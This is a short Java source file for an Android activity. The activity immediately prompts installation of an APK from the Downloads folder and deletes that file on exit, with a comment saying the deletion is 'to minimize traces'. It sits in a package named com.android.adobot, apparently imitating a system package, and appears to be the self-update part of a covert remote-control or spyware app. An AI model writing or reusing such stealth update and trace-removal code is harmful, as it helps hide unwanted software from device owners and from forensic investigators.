package com.android.adobot.activities;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import java.io.File;

import com.android.adobot.R;
import com.android.adobot.tasks.UpdateAppTask;

public class UpdateActivity extends AppCompatActivity {
    private Button btnUpdate;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_prompt_update);
        btnUpdate = (Button) findViewById(R.id.update_btn);
        btnUpdate.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                doUpdate();
            }
        });
        doUpdate();
    }

    private void doUpdate() {
        File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), UpdateAppTask.PKG_FILE);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
        getApplicationContext().startActivity(intent);
    }

    @Override
    protected void onDestroy() {
        //delete file on exit to minimize traces
        super.onDestroy();
        File updateFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), UpdateAppTask.PKG_FILE);
        if (updateFile.exists())
            updateFile.delete();
    }
}